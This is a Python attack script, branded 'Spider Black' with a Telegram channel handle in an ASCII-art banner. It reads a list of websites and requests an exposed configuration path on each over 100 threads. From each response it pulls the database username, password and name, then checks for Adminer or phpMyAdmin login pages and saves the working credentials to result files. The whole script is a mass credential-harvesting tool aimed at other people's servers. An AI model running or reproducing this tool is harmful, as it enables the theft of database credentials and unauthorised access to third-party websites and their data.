import sys
import requests,re,os
from multiprocessing.dummy import Pool as ThreadPool
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
white = "\033[97m"
try:os.system("cls")
except:os.system("clear")
print (f"""
{lgn}                                                                                                                            
                          .:==+***++=-.                        
                :#@@@+.  -%@@@@@@@@@@@@@%*=:                   
               *@@*#@=    =@@.   ..::-=*#%@@@*-                
             .#@+::.@%    +@#  .=====--:.  .:=*#+:             
           .=*=:*@* #@-   %@-   *@@@@@@@@@@%#*=-...            
              +@#*@#-@%  =@%   =@@+:...::-=+*#@@@@*=.          
           .=%*.  .@*@@:.@@- -%@#.              .-=+##+:       
         :=+-      =@%@+#@*+@@*+#%#+-                  ::      
{white}               -**+-@@@@@@@@%#@@@@@@@@#:                       
              ::+@@@@@@@@@@@@@@@@@@@@@@@%-                     
                +@@@{lrd}[{lgn}Spider Black{lrd}]{white}@@@@@@@%           
              -*#@@@@@@@@@@@@@@@@@@@@@@%=                      
          .     ::.:@@@%@@#@%#*%@@@@%*-                        
{lrd}         .-*#=     *%%@=+@%.+@@*=-:                 .-==:      
            .+@+. =@=@@. %@+  +@@+           .:-+*%@%+:        
           .-.:#@@@==@*  :@@.  .%@%*+++**#%@@@@%#+-.           
            .*#--%= %@.   #@+   #@@@@@@%%#*=-: .--.            
              =@%=.-@#    =@%   ...     .:=+*%%+:              
               .%@@@@-    +@@*++++**#%@@@@@#+:                 
                 -***=.  =#@@@@@@@@@@@%*+-                     
                             .:::::.          
     {lgn}   @_@ {white}Channel Telegram : {lrd} @Esfelurm #_#\n{yw}-------------------------------------------------------------------------------------------------'''
    
""")
def check(site):
    try:
        site = site.strip()
        op = requests.get("http://"+str(site)+"/.spider",timeout=7)
        if 'DB_PASSWORD=' in op.text:
            dbuser = str(re.findall('DB_USERNAME=(.*)', op.text)[0]).split("''")[0]
            dbpass = str(re.findall('DB_PASSWORD=(.*)', op.text)[0]).split("''")[0]
            dbname = str(re.findall('DB_DATABASE=(.*)', op.text)[0]).split("''")[0]
            ho = ['/adminer.php','/Adminer.php','/phpmyadmin']
            for hh in ho:
                try:
                    kk = requests.get('http://'+str(site)+hh,timeout=7)
                    if 'phpmyadmin.net' in kk.text:
                        print(f'{lrd}[{lgn}+{lrd}] {lgn}FOUND_PHPMYADMIN =>{cn} Url : {site} {hh} | {lgn}DB_user : {dbuser} | {yw}DB_pass={dbpass}')
                        pm = open('Result/phpmyadmin.txt','a').write('\nURL={}'.format(site)+'{} |'.format(hh)+'{}|'.format(dbuser)+'{}|'.format(dbpass)+'{}'.format(dbname))
                    elif 'Login - Adminer' in kk.text:
                        print(f'{lrd}[{lgn}+{lrd}] {lgn}FOUND_Adminer : {cn}URL={site} {hh} | {lgn}DB_user={dbuser} | {yw}DB_pass={dbpass}')
                        ad = open('Result/adminer.txt','a').write('\nURL={}'.format(site)+'{} |'.format(hh)+'{}|'.format(dbuser)+'{}|'.format(dbpass)+'{}'.format(dbname))
                    else:pass
                except:pass
    except:pass
ListPass = open(sys.argv[1], 'r').readlines()
pool = ThreadPool(100)
pool.map(check, ListPass)
pool.close()
pool.join()
print(f"\n{lrd}[{lgn}!{lrd}]{rd} Task Completed")